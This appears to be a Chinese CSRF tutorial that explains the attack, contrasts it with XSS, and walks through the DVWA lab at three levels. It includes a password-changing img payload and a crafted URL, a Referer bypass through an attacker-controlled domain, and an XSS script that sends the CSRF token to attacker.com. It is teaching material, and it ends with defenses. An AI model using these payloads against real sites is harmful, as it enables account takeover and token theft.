# CSRF漏洞讲解与实战：P1：CSRF漏洞原理与基础攻击 🔐

![](img/5b358ab46a2b87f95409c126a21fcae7_0.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_1.png)

在本节课中，我们将要学习跨站请求伪造（CSRF）漏洞的基本原理、攻击流程，并通过DVWA靶场进行实战演练，理解其与XSS的区别以及基础的攻击方法。

## 概述 📖

![](img/5b358ab46a2b87f95409c126a21fcae7_3.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_5.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_6.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_7.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_9.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_11.png)

CSRF攻击是攻击者伪造用户浏览器的请求，向用户之前访问过的网站发送请求，使网站误认为是用户本人的操作，从而执行敏感操作（如修改密码、转账等）。其核心在于网站能够确认请求来源于用户的浏览器，但无法确认该请求是否出自用户的真实意愿。

![](img/5b358ab46a2b87f95409c126a21fcae7_13.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_15.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_17.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_18.png)

## CSRF攻击原理与流程 🔄

![](img/5b358ab46a2b87f95409c126a21fcae7_20.png)

上一节我们介绍了CSRF的基本概念，本节中我们来看看其具体的攻击原理与流程。

攻击者实施CSRF攻击的前提是用户未登出目标网站（A网站），或A网站通过Session、Cookie等方式保存了用户的登录状态。当用户访问了攻击者控制的恶意网站（B网站）时，B网站会向A网站发起一个请求。由于用户的浏览器中存有A网站的认证信息（如Cookie），A网站会认为这是用户的合法请求并予以执行，从而完成攻击。

![](img/5b358ab46a2b87f95409c126a21fcae7_22.png)

下图简要说明了CSRF的攻击流程：
```
用户客户端 --> (正常交互) --> 网站A
用户客户端 --> (访问恶意链接) --> 恶意网站B --> (伪造请求) --> 网站A
```

![](img/5b358ab46a2b87f95409c126a21fcae7_24.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_25.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_27.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_29.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_31.png)

## CSRF与XSS的区别 ⚖️

![](img/5b358ab46a2b87f95409c126a21fcae7_33.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_35.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_37.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_39.png)

理解了CSRF的攻击模式后，我们将其与另一种常见漏洞XSS进行对比。

![](img/5b358ab46a2b87f95409c126a21fcae7_41.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_43.png)

CSRF与XSS的主要区别在于：
*   **XSS**：是双向攻击。攻击者在用户浏览器中执行恶意脚本，可以直接窃取用户的敏感信息（如Cookie、账号密码），之后攻击者可独立进行后续攻击。
*   **CSRF**：是单向攻击。攻击者无法直接获取用户的敏感信息，其核心在于利用用户已有的登录状态“欺骗”网站执行操作。攻击的持续进行依赖于持续蒙蔽用户或维持其登录状态。

![](img/5b358ab46a2b87f95409c126a21fcae7_45.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_47.png)

简单来说，XSS是“偷取你的身份凭证”，而CSRF是“冒充你的身份进行操作”。

![](img/5b358ab46a2b87f95409c126a21fcae7_49.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_51.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_53.png)

## CSRF攻击分类 📂

![](img/5b358ab46a2b87f95409c126a21fcae7_55.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_57.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_58.png)

根据请求方式的不同，CSRF攻击主要有以下几种类型：

![](img/5b358ab46a2b87f95409c126a21fcae7_60.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_62.png)

以下是常见的CSRF攻击分类：

![](img/5b358ab46a2b87f95409c126a21fcae7_64.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_66.png)

1.  **GET型CSRF**：利用`<img>`、`<iframe>`等标签的`src`属性，或诱导用户点击一个包含恶意参数的链接（URL），以GET方式提交请求。
    *   **示例**：`<img src="http://vuln-site.com/change_password?new_pass=attacker_pass">`
2.  **POST型CSRF**：构造一个隐藏的自动提交表单，当用户访问恶意页面时，以POST方式向目标网站提交数据。
    *   **示例**：一个包含`<form action="http://vuln-site.com/transfer" method="POST">`并自动执行`submit()`的页面。
3.  **Token泄漏型CSRF**：与XSS结合，先通过XSS漏洞窃取页面中的CSRF Token，再利用该Token构造有效的CSRF请求。
4.  **Flash CSRF**：利用Adobe Flash组件的漏洞发起攻击（现已较少见）。
5.  **JSON劫持**：当网站API以JSON格式返回敏感数据且未对请求来源做严格校验时，攻击者可通过特定脚本窃取这些数据。

![](img/5b358ab46a2b87f95409c126a21fcae7_68.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_70.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_72.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_74.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_76.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_78.png)

## DVWA靶场实战（Low级别）🎯

![](img/5b358ab46a2b87f95409c126a21fcae7_80.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_82.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_84.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_86.png)

现在，我们进入实战环节，首先在DVWA靶场的Low安全级别下体验最简单的CSRF攻击。

![](img/5b358ab46a2b87f95409c126a21fcae7_88.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_90.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_92.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_94.png)

### 漏洞代码分析

![](img/5b358ab46a2b87f95409c126a21fcae7_96.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_98.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_100.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_102.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_104.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_106.png)

查看后端源码，关键部分如下：
```php
if( isset( $_GET[ 'Change' ] ) ) {
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];
    if( $pass_new == $pass_conf ) {
        $pass_new = md5( $pass_new );
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        // ... 执行数据库更新
    }
}
```
代码直接通过`$_GET`获取前端参数，对`password_new`和`password_conf`是否一致进行验证，一致后则用MD5哈希更新密码。整个过程没有对请求来源进行任何校验，也没有使用防CSRF的Token。

![](img/5b358ab46a2b87f95409c126a21fcae7_108.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_110.png)

### 攻击构造与实施

![](img/5b358ab46a2b87f95409c126a21fcae7_112.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_114.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_116.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_118.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_120.png)

由于是GET型请求，攻击极其简单。只需诱使用户访问一个构造好的URL即可。

![](img/5b358ab46a2b87f95409c126a21fcae7_122.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_123.png)

1.  正常修改密码，观察URL结构。例如将密码改为`123456`，URL可能为：
    `http://靶场地址/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#`
2.  攻击者构造恶意链接，将`password_new`和`password_conf`参数改为任意值（如`hacked`）：
    `http://靶场地址/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change#`
3.  当已登录DVWA的用户访问此链接时，其密码就会被修改为`hacked`。

![](img/5b358ab46a2b87f95409c126a21fcae7_125.png)

**Burp Suite辅助工具**：在拦截到修改密码的请求后，可以使用Burp Suite的“Engagement tools” -> “Generate CSRF PoC”功能，自动生成一个包含自动提交脚本的HTML页面，用于演示或测试。

![](img/5b358ab46a2b87f95409c126a21fcae7_127.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_129.png)

## DVWA靶场实战（Medium级别）🛡️

![](img/5b358ab46a2b87f95409c126a21fcae7_131.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_133.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_135.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_137.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_138.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_140.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_142.png)

上一节我们轻松突破了Low级别的防护，本节中我们来看看Medium级别增加了哪些防护，以及如何绕过。

![](img/5b358ab46a2b87f95409c126a21fcae7_144.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_146.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_148.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_150.png)

### 漏洞代码分析

![](img/5b358ab46a2b87f95409c126a21fcae7_152.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_154.png)

查看Medium级别的源码，发现增加了以下校验：
```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] , $_SERVER[ 'SERVER_NAME' ] ) !== false ) {
    // 执行修改密码操作
}
```
这段代码检查HTTP请求头中的`Referer`字段是否包含服务器的名称（`SERVER_NAME`）。只有包含，才认为是合法请求。

![](img/5b358ab46a2b87f95409c126a21fcae7_156.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_158.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_160.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_161.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_163.png)

### 攻击绕过方法

![](img/5b358ab46a2b87f95409c126a21fcae7_165.png)

这种防护可以通过控制`Referer`来绕过。因为攻击者可以控制恶意页面所在的服务器域名。

1.  将恶意页面部署在一台攻击者控制的服务器上。
2.  将该服务器的域名设置为包含目标网站`SERVER_NAME`（例如，如果目标网站是`vuln-site.com`，攻击者服务器域名可以设置为`vuln-site.com.attacker.com`）。
3.  当用户从`vuln-site.com.attacker.com`访问恶意页面并发起请求时，`Referer`头中包含了`vuln-site.com`，从而绕过检查。

**本地测试技巧**：在本地测试时，可以将恶意页面的访问地址改为`http://127.0.0.1/evil.html`，因为`127.0.0.1`通常也会被包含在`SERVER_NAME`相关的校验逻辑中（取决于配置）。

## DVWA靶场实战（High级别）⚔️

High级别的防护通常更为严格，本节我们将面对Token验证的挑战。

![](img/5b358ab46a2b87f95409c126a21fcae7_167.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_169.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_171.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_173.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_175.png)

### 漏洞代码分析

![](img/5b358ab46a2b87f95409c126a21fcae7_177.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_179.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_181.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_183.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_185.png)

High级别的核心是加入了CSRF Token验证：
```php
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
// ... 检查通过后执行操作
```
每次页面加载时，都会生成一个随机的`user_token`，并存储在会话中。用户提交请求时，必须携带正确的`user_token`，后端通过`checkToken`函数进行校验。每次成功校验后，Token都会更新。

![](img/5b358ab46a2b87f95409c126a21fcae7_187.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_189.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_191.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_193.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_195.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_197.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_199.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_201.png)

### 攻击思路与绕过

![](img/5b358ab46a2b87f95409c126a21fcae7_203.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_205.png)

由于Token不可预测且每次变化，单纯的CSRF攻击无法成功。需要结合其他漏洞先获取Token。

![](img/5b358ab46a2b87f95409c126a21fcae7_207.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_208.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_210.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_212.png)

以下是两种常见的攻击思路：

![](img/5b358ab46a2b87f95409c126a21fcae7_214.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_216.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_218.png)

1.  **结合XSS获取Token**：如果网站同时存在XSS漏洞，可以注入脚本来窃取页面中的Token。
    *   **示例Payload**：`<script>document.location='http://attacker.com/steal?token='+document.getElementsByName('user_token')[0].value;</script>`
    *   该脚本会将Token发送到攻击者的服务器。获取Token后，再构造包含正确Token的CSRF请求。
2.  **利用浏览器插件辅助**：使用如`Token Tracker`之类的Burp Suite插件。首先让插件“学习”一次Token（即正常修改密码一次并让插件捕获），之后插件可以尝试预测或追踪Token的变化规律（在某些实现不严谨的情况下），用于后续攻击。

![](img/5b358ab46a2b87f95409c126a21fcae7_220.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_222.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_224.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_226.png)

**注意同源策略**：直接通过`document.getElementsByName`在跨域环境下获取Token会受到浏览器同源策略的限制，通常无法成功。因此，利用XSS（同域执行）是更有效的方法。

![](img/5b358ab46a2b87f95409c126a21fcae7_228.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_229.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_231.png)

## 总结 🎓

![](img/5b358ab46a2b87f95409c126a21fcae7_233.png)

本节课中我们一起学习了CSRF漏洞的核心原理、攻击流程及其与XSS的区别。我们了解到CSRF是一种利用用户登录状态进行“冒充”攻击的漏洞。通过DVWA靶场Low、Medium、High三个级别的实战，我们掌握了：
*   **基础GET型CSRF**的简单构造。
*   绕过基于`Referer`检查的**Medium级别防护**。
*   面对**High级别的Token防护**时，需要结合XSS等其他漏洞或使用辅助工具进行攻击的思路。

![](img/5b358ab46a2b87f95409c126a21fcae7_235.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_237.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_239.png)

![](img/5b358ab46a2b87f95409c126a21fcae7_240.png)

CSRF的防御关键在于识别“请求是否来自用户的真实意愿”，通常采用CSRF Token、验证码、检查`Referer`等方法。作为开发者，应正确实施这些防护；作为安全研究者，则需要理解这些防护措施的潜在绕过方式。